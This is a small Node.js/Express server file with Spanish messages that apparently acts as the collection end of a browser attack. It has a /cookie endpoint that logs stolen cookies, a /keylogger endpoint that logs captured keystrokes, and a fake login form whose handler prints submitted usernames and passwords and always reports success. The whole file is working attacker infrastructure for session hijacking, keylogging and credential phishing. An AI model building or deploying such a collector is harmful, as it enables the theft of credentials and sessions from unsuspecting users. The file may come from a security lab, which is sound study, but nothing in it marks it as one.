import cors from "cors";
import dotenv from "dotenv";
import express from "express";

dotenv.config();
const PORT = process.env.PORT || 8000;

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Agregado para procesar datos del formulario

app.get("/", (req, res) => {
  res.send("Api is working!");
});

app.post("/cookie", (req, res) => {
  const { cookie } = req.body;
  console.log(`Cookie recibida: ${cookie}`);
  res.status(200).send({
    status: "OK",
    code: 200,
    message: "Cookie recibida exitosamente",
  });
});

app.post("/keylogger", (req, res) => {
  const { keyboardLogger } = req.body;
  console.log(`Teclas registradas: ${keyboardLogger}`);
  res.status(200).send({
    status: "OK",
    code: 200,
    message: "Teclas registradas exitosamente",
  });
});

app.get("/login", (req, res) => {
  res.send(`
    <form action="/login" method="post">
      <input type="text" name="username" placeholder="Username">
      <input type="password" name="password" placeholder="Password">
      <input type="submit" value="Log in">
    </form>
  `);
});

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  console.log(req.body)
  console.log(`Username: ${username}, Password: ${password}`);
  res.send("Login successful!");
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
